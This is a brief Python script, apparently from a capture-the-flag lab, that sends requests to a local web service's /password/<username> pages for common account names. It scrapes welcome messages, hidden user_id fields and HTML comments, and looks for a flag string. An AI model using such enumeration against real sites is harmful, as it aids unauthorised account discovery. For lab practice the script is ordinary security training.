import requests
import re

base_url = "http://172.17.0.1:60001"

usernames = ["admin", "john", "user", "root", "flag", "test"]

for username in usernames:
    url = f"{base_url}/password/{username}"
    resp = requests.get(url)
    print(f"\n=== {url} ===")

    if "Welcome" in resp.text:
        welcome = re.search(r'<p class="mt-3 text-center">(Welcome, .*?)</p>', resp.text)
        if welcome:
            print(f"Welcome: {welcome.group(1)}")
    else:
        print("No welcome message found")

    user_id = re.search(r'name="user_id" value="(\d+)"', resp.text)
    if user_id:
        print(f"user_id: {user_id.group(1)}")
    else:
        print("No user_id found")

    comments = re.findall(r'<!--.*?-->', resp.text, re.DOTALL)
    if comments:
        print(f"Comments: {comments}")

    if "FLAG" in resp.text:
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"*** FLAG FOUND: {flag_match.group(0)} ***")

